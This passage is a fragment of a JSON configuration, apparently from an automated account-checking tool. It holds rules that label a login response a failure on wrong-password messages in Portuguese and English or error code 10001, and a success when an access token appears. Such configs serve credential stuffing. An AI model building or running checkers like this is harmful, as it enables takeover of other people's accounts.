          "keychains": [
            {
              "result": "Fail",
              "conditions": [
                {
                  "source": "data.SOURCE",
                  "comparison": "Contains",
                  "value": "Parece que n\u00e3o estamos conseguindo encontrar esta combina\u00e7\u00e3o de e-mail e senha. Tentar outra?"
                },
                {
                  "source": "data.SOURCE",
                  "comparison": "Contains",
                  "value": "\"error_code\":10001"
                },
                {
                  "source": "data.SOURCE",
                  "comparison": "Contains",
                  "value": "We cant seem to find that email and password combination"
                }
              ],
              "mode": "Or"
            },
            {
              "result": "Success",
              "conditions": [
                {
                  "source": "data.SOURCE",
                  "comparison": "Contains",
                  "value": "\"access_token\":\""
                }
              ],
              "mode": "And"
            }
          ],
          "stop_on_fail": true
        }
